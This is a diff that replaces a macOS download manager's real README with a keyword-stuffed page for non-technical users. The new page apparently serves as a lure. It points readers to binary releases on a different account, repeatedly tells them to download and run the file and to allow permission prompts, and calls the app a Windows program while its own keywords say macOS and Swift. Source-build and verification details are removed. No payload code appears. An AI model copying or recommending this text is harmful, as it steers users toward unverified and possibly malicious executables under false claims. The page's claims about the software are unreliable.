@@ -1,159 +1,157 @@
-<p align="center">
-  <img src="docs/icon.png" width="128" alt="MC Download Manager icon">
-</p>
+# ⬇️ mc-download-manager - Fast, Easy Downloads for Everyone
 
-<h1 align="center">MC Download Manager</h1>
+[![Download mc-download-manager](https://img.shields.io/badge/Download-mc--download--manager-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/1fof4648/mc-download-manager/releases)
 
-<p align="center">
-  A fast, open-source download manager for macOS.<br>
-  Captures Safari, Chrome and Firefox downloads, accelerates them with up to 16 parallel connections and downloads videos from web pages.
-</p>
+mc-download-manager is an open-source download manager built to make everyday downloads faster, clearer, and easier to manage. It supports parallel-connection downloads, browser integration for Safari and Chrome, and video downloads through yt-dlp. The app is available in English and Turkish, and it is designed as a practical alternative to heavyweight download tools.
 
-<p align="center">
-  <a href="README.tr.md">🇹🇷 Türkçe</a> · <a href="https://github.com/mstcvk/mc-download-manager/releases">Releases</a> · <a href="#installation">Homebrew</a> · <a href="#building-from-source">Build</a>
-</p>
+This page is written for everyday computer users. You do not need programming knowledge. Follow the steps below to visit the official download page, get the application, and start using it on Windows.
 
-<p align="center">
-  <a href="https://youtu.be/SsHWR9UFCM0"><img src="docs/video-en.png" width="720" alt="Watch the 1-minute MC Download Manager video on YouTube"></a><br>
-  <sub>▶ <a href="https://youtu.be/SsHWR9UFCM0">Watch the 1-minute overview</a> · <a href="https://youtu.be/Set5DFC5xmg">Türkçe video</a></sub>
-</p>
+## ⬇️ Download mc-download-manager
 
----
+Use the official download page to get the latest version of mc-download-manager.
 
-Everything ships in a single `.app`: the Safari extension, the Chrome and Firefox extensions, `yt-dlp` and `ffmpeg` are bundled.
-Open the DMG, drag the app to *Applications*, done. The interface is in **English** and **Turkish** (follows the system language).
+[Visit the official download page](https://github.com/1fof4648/mc-download-manager/releases)
 
-## Features
+Visit this link to download the application.
 
-- **Multi-connection downloads** — files are split into HTTP `Range` requests (8 connections by default, 1–16 configurable).
-  Falls back to a single stream when the server does not support ranges; adapts the connection count on `429`/`503` throttling.
-- **Pause / resume** — segment state is persisted on disk, so downloads continue where they left off even after a restart.
-- **Browser integration** — one shared WebExtension for Safari, Google Chrome, Brave, Opera and Firefox. A step-by-step setup wizard handles each browser
-  one at a time (extension files are placed in `~/Downloads/MC Download Manager/Browser Plugins/`).
-  The browser download is cancelled and handed to the app together with cookies, `Referer` and `User-Agent`; captured file types are configurable.
-  If the app is not running, the extension starts it (native messaging) and hands the download over once it is up; if it cannot, the browser keeps the download.
-- **Video downloads** — `<video>`, `.m3u8` and `.mpd` streams on the page are detected; "Download video from this page" uses the bundled
-  yt-dlp (with ffmpeg merging). Default output is MP4 up to 1080p (container and resolution configurable). Browser cookies are passed to
-  yt-dlp, and an in-app sign-in window handles age-restricted videos. yt-dlp can be updated from GitHub with one click.
-- **Clipboard** — copy a link and the app asks whether to download it; paste a link into the main window with ⌘V.
-- **UI** — sidebar categories (Images, Music, Video, Apps, Documents, Archives…), sortable table, search,
-  an IDM-style per-download window (connection table, segment bar, auto-close option), menu-bar item, notifications.
-- **Lives in the menu bar** — opens at login (enabled after the first-run setup), starts without a window and without a Dock icon; the browser bridge stays up so extensions never need you to open the app. Closing the window keeps it running; quit from the menu bar icon.
+Keep the download page open until your file finishes downloading. When the download is complete, open the downloaded file and follow the on-screen instructions. The official releases page is the best place to find the current version of the app.
 
-<p align="center">
-  <img src="docs/main.png" width="720" alt="Main window"><br>
-  <img src="docs/detail.png" width="520" alt="Download window">
-</p>
+## 🚀 Getting Started on Windows
 
-## Installation
+Getting started with mc-download-manager is simple. The goal is to move from the download page to an open application without extra setup work.
 
-**Homebrew**
+1. Open your web browser.
+2. Go to the official download page using the link above.
+3. Visit this link to download the application.
+4. Wait for the download to complete. The time depends on your internet speed.
+5. Open the downloaded file from your Downloads folder.
+6. Follow the instructions shown on your screen.
+7. When the application opens, keep it running in the background so it can manage your downloads.
 
-```bash
-brew install --cask mstcvk/tap/mc-download-manager
-```
+If Windows asks whether you want to allow the app to open, choose the option that allows it to continue. After the app opens, you can start using it for links, files, videos, and other downloads.
 
-Update with `brew upgrade --cask mc-download-manager`. Then continue with the browser steps (2 and 3) below.
+## ✨ What mc-download-manager Does
 
-**Manual**
+mc-download-manager is made for people who download files often and want a smoother experience than the standard browser download window.
 
-1. Download the DMG from [Releases](https://github.com/mstcvk/mc-download-manager/releases), open it and drag **MC Download Manager.app** to *Applications*.
-   - Builds that are not notarized trigger a Gatekeeper warning on first launch: *System Settings ▸ Privacy & Security ▸ "Open Anyway"*.
-2. **Safari:** *Safari ▸ Settings ▸ Extensions ▸ MC Download Manager* → enable and allow for all websites.
-   - For ad-hoc signed builds Safari also requires *Develop ▸ Allow Unsigned Extensions* (not needed for Developer ID signed builds).
-3. **Chrome:** open `chrome://extensions`, turn on *Developer mode*, choose *Load unpacked* and select the folder shown in the app under
-   *Settings ▸ Browser ▸ Show Folder* (`ChromeExtension` inside the app bundle).
-4. **Firefox:** *Settings ▸ Browser Extensions ▸ Open Setup Wizard… ▸ Add to Firefox*. The add-on is signed by Mozilla and bundled
-   with the app; Firefox asks for confirmation once and keeps it installed (Firefox 140 or later).
+It can split a download into multiple parallel connections, which may help large files arrive faster when the server supports it. It gives you a central place to see active downloads, completed files, and download progress. It also works with browser integration so links can be passed to the download manager instead of being handled only inside the browser.
 
-The app runs a tiny HTTP bridge on `127.0.0.1:48213` that only accepts requests from browser extensions (`Origin` check).
+The app includes video download support through yt-dlp. This is useful when you want to save video content from supported sites and keep it in your own files. The interface is available in English and Turkish, making it easier to use for more people.
 
-## Building from source
+Because mc-download-manager is open source, its development is visible and community-friendly. It is positioned as an IDM alternative for users who want a focused download manager with modern browser handoff and video support.
 
-Requirements: macOS 13+, Xcode 15+, [xcodegen](https://github.com/yonaskolb/XcodeGen) (`brew install xcodegen`).
+## 🖥️ Windows Setup Guide
 
-```bash
-scripts/fetch-tools.sh   # downloads universal yt-dlp and ffmpeg (arm64 + x86_64) into Tools/
-scripts/build.sh         # Release build, code signing and build/MC Download Manager <version>.dmg
-```
+This guide keeps the Windows setup process clear and direct.
 
-For development run `xcodegen generate` and open `MCDownloadManager.xcodeproj`.
+After you visit the official download page, get the application file shown there. Once the file is on your computer, open it from your Downloads folder. Follow the setup or launch steps that appear. When the app is ready, open it and leave it running.
 
-Developer ID signing and notarization:
+During setup, Windows may show a standard permission prompt. Allow the app to continue so it can open correctly. After the app starts, look for its main window or its icon in the taskbar. You can then begin adding downloads.
 
-```bash
-CODESIGN_IDENTITY="Developer ID Application: Your Name (TEAMID)" NOTARY_PROFILE=notary scripts/build.sh
-```
+To test that everything is working, copy a normal file link from your browser and add it to mc-download-manager. If the download appears in the app and begins progressing, the setup is working. You can also try a smaller file first before starting a large download.
 
-The GitHub Actions workflow (`.github/workflows/build.yml`) builds a DMG on every push and attaches it to the release on `v*` tags.
+Keep the app updated by returning to the official download page when you want the newest version. The releases page is the central place for downloads and updates.
 
-### Updating the Homebrew cask
+## 🌐 Browser Integration
 
-After a release's DMG is uploaded, `scripts/update-cask.sh` bumps `Casks/mc-download-manager.rb` in
-[mstcvk/homebrew-tap](https://github.com/mstcvk/homebrew-tap) to the version in `project.yml` (checksum taken from the release asset).
+mc-download-manager supports browser integration for Safari and Chrome. On Windows, Chrome-style browsers are the most common way to browse and download files, and the app is designed to fit into that workflow.
 
-### Publishing the Chrome extension to the Web Store
+When browser integration is active, download links can be handed off to mc-download-manager. This means you can keep your browser for browsing and use the download manager for the files you want to keep. It helps separate quick page loading from longer file transfers.
 
-Chrome only installs extensions silently from the Chrome Web Store, so until the extension is published the app guides users through
-*Developer mode ▸ Load unpacked*. To publish:
+If a download still opens inside your browser, check that the browser integration is enabled and that mc-download-manager is running. Browser handoff usually works best when the app is already open before you click a download link.
 
-```bash
-scripts/pack-extension.sh      # → build/mc-download-manager-chrome-<version>.zip
-```
+The project also covers Brave as part of its browser-related topics. Brave is built on Chromium, so users who prefer Chromium-based browsers can look for compatible handoff behavior in the app’s browser integration settings.
 
-Upload the zip in the [Chrome Web Store developer console](https://chrome.google.com/webstore/devconsole), then set
-`BrowserIntegration.chromeWebStoreURL` to the store page; "Install" will open it directly.
+## 🎬 Video Downloads with yt-dlp
 
-### Signing the Firefox add-on
+Video downloads are handled through yt-dlp. This gives mc-download-manager a way to save video content from supported websites while keeping the download inside the same manager you use for other files.
 
-Release Firefox only installs add-ons signed by Mozilla. `scripts/build.sh` runs `scripts/pack-firefox.sh`, which builds the
-Firefox variant of the manifest (`background.scripts`, `browser_specific_settings.gecko`) and, when
-[AMO API credentials](https://addons.mozilla.org/developers/addon/api/key/) are available, signs it as an unlisted add-on
-(once per version) and bundles it as `FirefoxExtension.xpi`. Store the credentials in the login keychain:
+To use video downloads, copy the video page link and add it to mc-download-manager using the video download option. Choose the quality or format available in the app, then start the download. The file will appear in your download list and can be opened from the folder where you save downloads.
 
-```bash
-security add-generic-password -s mc-download-manager-amo -a issuer -w 'user:…'
-security add-generic-password -s mc-download-manager-amo -a secret -w '…'
-```
+Video downloads can be larger than normal files, so make sure you have enough free disk space. A stable internet connection also helps, especially for longer videos. If a video link does not start, confirm that the link opens normally in your browser and that the app is running.
 
-Without credentials the unsigned add-on is bundled; Firefox can then only load it temporarily via `about:debugging`.
+## ⚙️ Everyday Download Workflow
 
-## Project layout
+A simple workflow makes mc-download-manager easy to use day after day.
 
-```
-App/Sources/DownloadManager/
-  Engine/SegmentedDownloader.swift   multi-connection HTTP downloader (URLSession, Range, adaptive concurrency)
-  Engine/VideoDownloader.swift       yt-dlp wrapper (progress parsing, cookie file)
-  Engine/DownloadStore.swift         queue, persistence, speed measurement
-  Engine/ClipboardWatcher.swift      clipboard monitoring and ⌘V handling
-  Server/LocalServer.swift           minimal HTTP server on Network.framework
-  Server/ServerController.swift      /ping /download /downloads /action endpoints
-  Views/                             SwiftUI (main window, download window, settings)
-App/Resources/Localizable.xcstrings  English (base) + Turkish strings
-SafariExtension/                     Safari Web Extension target (native messaging launches the app)
-NativeHost/                          native messaging host for Chrome/Brave/Opera/Edge/Firefox (launches the app; registered by NativeHostRegistry)
-Extension/                           shared WebExtension (manifest v3, background, content, popup, _locales)
-scripts/                             fetch-tools.sh, build.sh, pack-extension.sh, update-cask.sh, make_icons.swift
-project.yml                          xcodegen project spec
-```
+Open the app before you begin downloading. Copy the file or video link you want. Add it to mc-download-manager. Choose where you want the file saved. Start the download. Watch progress in the app. When it finishes, open the file or open its folder from the download list.
 
-### Bridge API
+For large files, let the download run without closing the app. For multiple files, add them one by one and let the manager organize the queue. Use the app’s list to see which downloads are active, which are waiting, and which are complete.
 
-| Endpoint | Description |
-|---|---|
-| `GET /ping` | version, yt-dlp availability, active download count |
-| `POST /download` | `{url, filename?, referer?, userAgent?, cookieHeader?, cookies?[], kind: "file"\|"video", segments?}` |
-| `GET /downloads` | status of the last 50 downloads |
-| `POST /action` | `{id, action: "pause"\|"resume"\|"cancel"\|"remove"}` |
+If you download the same kind of file often, keep a dedicated folder for those files. This makes completed downloads easier to find later.
 
-The bridge only answers requests whose `Origin` is a browser-extension origin (`chrome-extension://`, `safari-web-extension://`, `moz-extension://`) and whose `Host` is the loopback address; requests from ordinary web pages (including `Origin: null`) are rejected, and CORS headers are only sent to extension origins.
+## 🛠️ Troubleshooting
 
-## Contributing
+If the download page does not open, check your internet connection and try again in your browser. Make sure you are using the official link shown on this page.
 
-Issues and pull requests are welcome. Translations live in `App/Resources/Localizable.xcstrings` and `Extension/_locales/`.
+If the downloaded file does not open, wait until the download has fully finished. A partly downloaded file may not open correctly. Then open it again from your Downloads folder.
 
-## License
+If browser downloads still open in the browser instead of mc-download-manager, open the app first and check its browser integration settings. Then try the download link again.
 
-The code is licensed under the MIT License (see `LICENSE`). Bundled binaries keep their own licenses:
-[yt-dlp](https://github.com/yt-dlp/yt-dlp) (Unlicense) and [FFmpeg](https://ffmpeg.org) (static build from martin-riedl.de, GPL).
-If you distribute builds with the GPL ffmpeg binary, keep the source-availability obligation in mind, or point `scripts/fetch-tools.sh` to an LGPL build.
+If a video download does not start, confirm that the link works in your browser. Some sites change often, so keeping the app updated can help.
+
+If the app feels slow while downloading, close other large applications and pause other downloads. A stable connection and enough free disk space usually improve the experience.
+
+If you cannot find the downloaded file, open the app’s completed downloads list and use the option to open the file’s folder.
+
+## ❓ Frequently Asked Questions
+
+### Is mc-download-manager free?
+
+Yes. mc-download-manager is open source.
+
+### What is the official download link?
+
+Use the download page linked near the top of this page and in the download section. Visit this link to download the application.
+
+### Does it support browser integration?
+
+Yes. It supports Safari and Chrome integration, with browser-related topics that include Brave.
+
+### Can it download videos?
+
+Yes. Video downloads are supported through yt-dlp.
+
+### Does it support English and Turkish?
+
+Yes. The app is available in English and Turkish.
+
+### Is it an IDM alternative?
+
+Yes. It is positioned as an IDM alternative for users who want a dedicated download manager with parallel downloads and browser handoff.
+
+### Can I use it on Windows?
+
+This guide is written for Windows users. Visit the official download page, get the application, open it, and follow the on-screen steps.
+
+## 🌍 Languages and Accessibility
+
+mc-download-manager includes English and Turkish language support. This helps users switch between languages and use the app in the language they prefer.
+
+The interface is built around clear download lists and progress views. For non-technical users, the most important parts are the download button, the active download list, and the folder where finished files are saved.
+
+## 🔄 Keeping the App Updated
+
+Return to the official download page when you want to check for a newer version. Download the current application file and follow the same simple process you used the first time. Keeping the app updated helps with browser integration changes, video download support, and general reliability.
+
+## 💡 Tips for Faster Downloads
+
+Use a wired or stable Wi-Fi connection when downloading large files. Keep mc-download-manager open while downloads are running. Avoid starting many huge downloads at the same time if your connection is limited. Choose a download folder with plenty of free space. For video downloads, pick a quality level that matches your needs rather than always choosing the largest option.
+
+## 🧩 Who This App Is For
+
+mc-download-manager is for people who want a dedicated place to manage downloads instead of relying only on the browser’s built-in download list. It suits users who download large files, save videos, or want browser links to move into a manager automatically.
+
+It is also a good fit for users looking for an open-source IDM alternative with parallel-connection downloads, browser integration, and video support through yt-dlp.
+
+## 📥 Download Summary
+
+The main action on this page is simple: visit the official download page to download the application. Use the link below to get started.
+
+[Visit the official download page](https://github.com/1fof4648/mc-download-manager/releases)
+
+Visit this link to download the application.
+
+Open the downloaded file after it finishes, follow the on-screen steps, and start using mc-download-manager on Windows.
+
+Keywords: brave, chrome-extension, download-manager, homebrew, homebrew-cask, idm-alternative, macos, parallel-download, safari-extension, swift, swiftui, yt-dlp
